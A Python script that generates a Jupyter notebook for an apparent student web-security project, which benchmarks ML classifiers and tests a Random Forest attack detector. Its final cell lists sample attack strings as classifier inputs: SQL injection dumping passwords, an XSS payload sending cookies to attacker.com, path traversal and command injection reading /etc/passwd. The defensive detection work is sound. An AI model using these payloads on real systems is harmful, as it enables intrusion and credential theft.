"""Generates the companion presentation Jupyter Notebook for Phase 5.

This notebook provides an interactive demonstration environment for:
1. Loading the dataset and extracting the 17-D canonical feature vectors
2. Visualizing the Multi-Model Candidate Benchmark (F1 vs Latency)
3. Plotting the Confusion Matrix Heatmap (Seaborn)
4. Plotting the 17-Feature Importance Ranking bar chart
5. Real-time test of sample attack payloads through the Champion Random Forest
"""

import json
from pathlib import Path


def create_phase5_notebook(output_path: str = "ml-engine/notebooks/01_train_and_benchmark.ipynb"):
    nb = {
        "cells": [
            {
                "cell_type": "markdown",
                "metadata": {},
                "source": [
                    "# PBL6 — PHASE 5: MULTI-MODEL BENCHMARKING & RANDOM FOREST (CHAMPION MODEL)\n",
                    "## Web API Security Platform & Autonomous Red Teaming on Distributed Cyber Range\n",
                    "\n",
                    "> **Tác giả:** Thành viên A (Tech Lead & Defense AI/ML Engineer)\n",
                    "> **Cơ sở khoa học:** [Ref 08] Wiley SCN 2015, [Ref 09] IEEE Access 2024, [Ref 15 & 16] OWASP Benchmark Project\n",
                    "> **Mục đích:** Khảo sát thực nghiệm 5 trường phái thuật toán trên tập 20.000 mẫu (vector 17 đặc trưng), trực quan hóa ma trận nhầm lẫn (Confusion Matrix) và bảng đóng góp đặc trưng (Feature Importance)."
                ]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "# 1. Setup paths & imports\n",
                    "import json\n",
                    "import sys\n",
                    "from pathlib import Path\n",
                    "\n",
                    "import joblib\n",
                    "import matplotlib.pyplot as plt\n",
                    "import numpy as np\n",
                    "import pandas as pd\n",
                    "import seaborn as sns\n",
                    "from sklearn.metrics import confusion_matrix\n",
                    "\n",
                    "# Ensure ml-engine and gateway modules are in path\n",
                    "repo_root = Path.cwd().parent if Path.cwd().name == 'notebooks' else Path.cwd()\n",
                    "ml_dir = repo_root / 'ml-engine'\n",
                    "for p in [str(repo_root), str(ml_dir)]:\n",
                    "    if p not in sys.path:\n",
                    "        sys.path.insert(0, p)\n",
                    "\n",
                    "from features.extractor import CANONICAL_FEATURE_NAMES, extract_17_features  # noqa: E402\n",
                    "from models.train_rf import load_combined_dataset, split_dataset  # noqa: E402\n",
                    "\n",
                    "print('Environment initialized successfully!')"
                ]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "# 2. Load the 20,000 requests dataset\n",
                    "data_dir = repo_root / 'data'\n",
                    "X, y, df_combined = load_combined_dataset(data_dir=data_dir)\n",
                    "\n",
                    "print(f'Total Dataset Records: {len(df_combined):,}')\n",
                    "print(f'Feature Matrix X shape: {X.shape}')\n",
                    "print('\\nClass Distribution:')\n",
                    "print(pd.Series(y).value_counts())"
                ]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "# 3. Load Multi-Model Benchmark Results & Plot Comparison\n",
                    "benchmark_file = repo_root / 'ml-engine' / 'artifacts' / 'benchmark_summary.json'\n",
                    "\n",
                    "if benchmark_file.exists():\n",
                    "    with open(benchmark_file, encoding='utf-8') as f:\n",
                    "        b_results = json.load(f)\n",
                    "    df_bench = pd.DataFrame(b_results)\n",
                    "    display(df_bench[['model_name', 'paradigm', 'f1_macro', 'accuracy', 'youden_index_j', 'avg_latency_ms']])\n",
                    "\n",
                    "    # Plot F1-Macro vs Inference Latency\n",
                    "    fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14, 5))\n",
                    "\n",
                    "    sns.barplot(data=df_bench, x='f1_macro', y='model_name', ax=ax1, palette='Blues_d')\n",
                    "    ax1.set_title('F1-Score (Macro) Across 5 Candidate Models')\n",
                    "    ax1.set_xlim(0.85, 1.01)\n",
                    "    ax1.set_xlabel('F1-Macro')\n",
                    "\n",
                    "    sns.barplot(data=df_bench, x='avg_latency_ms', y='model_name', ax=ax2, palette='Reds_d')\n",
                    "    ax2.set_title('Inference Latency per Sample (ms) on CPU')\n",
                    "    ax2.axvline(15.0, color='r', linestyle='--', label='Max Latency Budget (15ms)')\n",
                    "    ax2.set_xlabel('Latency (ms)')\n",
                    "    ax2.legend()\n",
                    "\n",
                    "    plt.tight_layout()\n",
                    "    plt.show()\n",
                    "else:\n",
                    "    print('Benchmark summary not yet found. Please run train_rf.py first.')"
                ]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "# 4. Load Champion Random Forest Model and Plot Confusion Matrix\n",
                    "model_file = repo_root / 'ml-engine' / 'artifacts' / 'rf_model.joblib'\n",
                    "champion_rf = joblib.load(model_file)\n",
                    "\n",
                    "# Evaluate on Test Set\n",
                    "X_train, y_train, X_val, y_val, X_test, y_test = split_dataset(X, y)\n",
                    "y_pred = champion_rf.predict(X_test)\n",
                    "classes = list(champion_rf.classes_)\n",
                    "\n",
                    "cm = confusion_matrix(y_test, y_pred, labels=classes)\n",
                    "\n",
                    "plt.figure(figsize=(8, 6))\n",
                    "sns.heatmap(cm, annot=True, fmt='d', cmap='Blues', xticklabels=classes, yticklabels=classes)\n",
                    "plt.title('Champion Random Forest — Confusion Matrix (Test Set N=3,000)')\n",
                    "plt.xlabel('Predicted Label')\n",
                    "plt.ylabel('Ground Truth Label')\n",
                    "plt.show()"
                ]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "# 5. 17-Dimensional Feature Importance Ranking (Wiley SCN 2015)\n",
                    "importances = champion_rf.feature_importances_\n",
                    "feat_df = pd.DataFrame({\n",
                    "    'Feature': CANONICAL_FEATURE_NAMES,\n",
                    "    'Importance': importances\n",
                    "}).sort_values('Importance', ascending=True)\n",
                    "\n",
                    "plt.figure(figsize=(10, 7))\n",
                    "plt.barh(feat_df['Feature'], feat_df['Importance'], color='#047857')\n",
                    "plt.title('17-Dimensional Feature Importance Ranking (Torrano-Gimenez et al. 2015)')\n",
                    "plt.xlabel('Gini Importance Ratio')\n",
                    "plt.grid(axis='x', linestyle='--', alpha=0.7)\n",
                    "plt.show()"
                ]
            },
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": [
                    "# 6. Live Inference Quick Test with Real-time Predictions\n",
                    "test_payloads = [\n",
                    "    ('Benign Normal Request', '/api/books/12/read/?page=3'),\n",
                    "    ('SQL Injection Union Attack', \"admin' UNION SELECT 1, username, password FROM users--\"),\n",
                    "    ('Cross-Site Scripting (XSS)', \"<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>\"),\n",
                    "    ('Path Traversal Obfuscated', \"/download/?file=..%2f..%2f..%2fetc%2fpasswd%00.jpg\"),\n",
                    "    ('Command Injection Subshell', \"127.0.0.1 | $(cat /etc/passwd | base64)\")\n",
                    "]\n",
                    "\n",
                    "print(f'{\"Payload Description\":<30} | {\"Predicted Class\":<20} | {\"Confidence\":<10}')\n",
                    "print('-' * 70)\n",
                    "for desc, payload in test_payloads:\n",
                    "    vec = extract_17_features(payload).to_numpy().reshape(1, -1)\n",
                    "    pred_cls = champion_rf.predict(vec)[0]\n",
                    "    prob = float(np.max(champion_rf.predict_proba(vec)))\n",
                    "    print(f'{desc:<30} | {pred_cls:<20} | {prob*100:.2f}%')\n"
                ]
            }
        ],
        "metadata": {
            "kernelspec": {
                "display_name": "Python 3",
                "language": "python",
                "name": "python3"
            },
            "language_info": {
                "name": "python",
                "version": "3.12"
            }
        },
        "nbformat": 4,
        "nbformat_minor": 4
    }

    out_file = Path(output_path)
    out_file.parent.mkdir(parents=True, exist_ok=True)
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(nb, f, indent=2, ensure_ascii=False)
    print(f"Jupyter Notebook generated successfully at: {out_file}")


if __name__ == "__main__":
    create_phase5_notebook()
